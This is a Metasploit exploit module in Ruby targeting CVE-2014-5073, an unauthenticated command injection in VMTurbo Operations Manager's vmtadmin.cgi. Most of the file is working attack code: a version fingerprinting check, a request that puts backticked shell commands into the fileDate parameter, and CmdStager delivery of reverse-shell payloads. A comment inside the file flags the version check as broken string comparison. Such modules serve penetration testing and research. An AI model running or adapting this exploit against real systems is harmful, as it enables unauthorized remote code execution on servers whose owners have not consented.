##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager
  include Msf::Exploit::EXE

  def initialize(info = {})
    super(update_info(info,
      'Name'        => 'VMTurbo Operations Manager vmtadmin.cgi Remote Command Execution',
      'Description' => %q{
          VMTurbo Operations Manager 4.6 and prior are vulnerable to unauthenticated
          OS Command injection in the web interface. Use reverse payloads for the most
          reliable results. Since it is a blind OS command injection vulnerability,
          there is no output for the executed command when using the cmd generic payload.
          Port binding payloads are disregarded due to the restrictive firewall settings.

          This module has been tested successfully on VMTurbo Operations Manager versions 4.5 and
          4.6.
      },
      'Author'      =>
        [
          # Secunia Research - Discovery and Metasploit module
          'Emilio Pinna <emilio.pinn[at]gmail.com>'
        ],
      'License'     => MSF_LICENSE,
      'References'  =>
        [
            ['CVE', '2014-5073'],
            ['OSVDB', '109572'],
            ['URL', 'http://web.archive.org/web/20140905004331/http://secunia.com:80/secunia_research/2014-8/']
        ],
      'DisclosureDate' => '2014-06-25',
      'Privileged'     => false,
      'Platform'       => %w{ linux unix },
      'Payload'        =>
        {
          'Compat'   =>
          {
            'ConnectionType' => '-bind'
          }
        },
      'Targets'        =>
      [
        [ 'Unix CMD',
          {
            'Arch' => ARCH_CMD,
            'Platform' => 'unix'
          }
        ],
        [ 'VMTurbo Operations Manager',
          {
          'Arch' => [ ARCH_X86, ARCH_X64 ],
          'Platform' => 'linux'
          }
        ],
      ],
      'DefaultTarget'  => 1
      ))

    deregister_options('CMDSTAGER::DECODER', 'CMDSTAGER::FLAVOR')
  end

  def check
  begin
    res = send_request_cgi({
      'method' => 'GET',
      'uri'    => "/cgi-bin/vmtadmin.cgi",
      'vars_get' => {
        "callType" => "ACTION",
        "actionType" => "VERSIONS"
      }
    })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error("Failed to connect to the web server")
      return Exploit::CheckCode::Unknown
  end

  if res and res.code == 200 and res.body =~ /vmtbuild:([\d]+),vmtrelease:([\d.]+),vmtbits:[\d]+,osbits:[\d]+/
    version = $2
    build = $1

    vprint_status("VMTurbo Operations Manager version #{version} build #{build} detected")
    else
      vprint_status("Unexpected vmtadmin.cgi response")
      return Exploit::CheckCode::Unknown
    end

    # NOTE (@todb): This PHP style comparison seems incorrect, since
    # strings are being compared and not numbers. Example:
    # 1.9.3p547 :001 > a = "4.6"
    #  => "4.6"
    # 1.9.3p547 :002 > b = "10.6"
    #  => "10.6"
    # 1.9.3p547 :003 > a <= b
    #
    # Also, the description says 4.5 is also vuln. This doesn't
    # appear to care.
    if version and version <= "4.6" and build < "28657"
      return Exploit::CheckCode::Appears
    else
      return Exploit::CheckCode::Safe
    end
  end

  def execute_command(cmd, opts)
    begin
    res = send_request_cgi({
      'uri'    => '/cgi-bin/vmtadmin.cgi',
      'method' => 'GET',
      'vars_get' => {
        "callType" => "DOWN",
        "actionType" => "CFGBACKUP",
        "fileDate" => "\"`#{cmd}`\""
      }
    })
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
      vprint_error("Failed to connect to the web server")
      return nil
    end

    vprint_status("Sent command #{cmd}")
  end

  def exploit

    # Handle single command shot
    if target.name =~ /CMD/
      cmd = payload.encoded
      res = execute_command(cmd, {})

      unless res
        fail_with(Failure::Unknown, "#{peer} - Unable to execute payload")
      end

      print_status("Blind Exploitation - unknown exploitation state")
      return
    end

    # Handle payload upload using CmdStager mixin
    execute_cmdstager({:flavor => :printf})
  end
end
